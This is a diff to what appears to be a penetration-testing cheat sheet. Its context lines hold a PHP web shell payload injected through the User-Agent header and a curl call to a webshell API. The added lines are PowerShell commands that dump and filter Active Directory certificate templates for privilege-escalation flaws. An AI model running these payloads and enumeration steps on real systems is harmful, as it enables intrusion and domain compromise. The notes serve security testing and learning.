@@ -737,3 +737,21 @@ $ curl -s "http://XXX.XXX.XXX.XXX:RPORT/index.php" -A '<?php system($_GET["cmd"]
 # User-Agent: <?php system($_GET['cmd']); ?>
 $ curl -X POST 'http://XXX.XXX.XXX.XXX:8080/webshell/api' --data "action=exec&cmd=id" 
 ```
+```powershell
+PS> Get-Content .\cert_templates.txt | sls -Pattern "(Template\[|Backup Operators|Remote Desktop Users|Domain Users|Client Authentication|CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)"
+PS> Get-Content .\cert_templates.txt -Raw `
+| Foreach-Object {$_ -replace "\r\n", "aaaa" -replace "\n", "aaaa"} `
+| sls -Pattern "Template\[31\].*?Template\[32\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
+| Foreach-Object {$_ -replace "aaaa", "`n"}
+PS>
+# not expected output
+PS> certutil -v -template > cert_templates.txt
+PS> net user <username> /domain
+PS> Get-Content .\cert_templates.txt -Raw `
+| Foreach-Object {$_ -replace "\r\n", "aaaa" -replace "\n", "aaaa"} `
+| Select-String -Pattern "Template\[.*?\].*?(Backup Operators|Remote Desktop Users|Domain Users).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
+| Select-String -Pattern "Template\[.*?\].*?(Client Authentication).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
+| Select-String -Pattern "Template\[.*?\].*?(CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
+| Select-String -Pattern "Template\[.*?\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
+| Foreach-Object {$_ -replace "aaaa", "`n"}
+```
